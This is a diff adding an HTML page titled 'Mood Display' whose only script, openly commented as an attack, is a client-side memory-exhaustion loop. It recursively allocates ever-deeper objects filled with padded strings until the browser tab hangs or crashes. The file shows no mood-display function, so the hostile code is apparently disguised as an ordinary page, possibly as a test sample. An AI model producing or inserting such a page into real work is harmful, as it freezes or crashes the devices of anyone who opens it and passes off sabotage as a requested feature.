@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Mood Display</title>
+</head>
+<body>
+  <div id="root">Loading...</div>
+  <script>
+    // Attack: Recursive object allocation to exhaust memory
+    function createDeepObject(depth) {
+      if (depth <= 0) return { data: 'x'.repeat(1000) };
+      return { nested: createDeepObject(depth - 1), data: 'y'.repeat(1000) };
+    }
+    
+    // Allocate progressively deeper objects
+    let depth = 1;
+    const maxDepth = 100000;
+    
+    while (depth < maxDepth) {
+      try {
+        const obj = createDeepObject(depth);
+        depth++;
+        if (depth % 100 === 0) {
+          document.getElementById('root').textContent = 'Depth: ' + depth;
+        }
+      } catch (e) {
+        break;
+      }
+    }
+  </script>
+</body>
+</html>
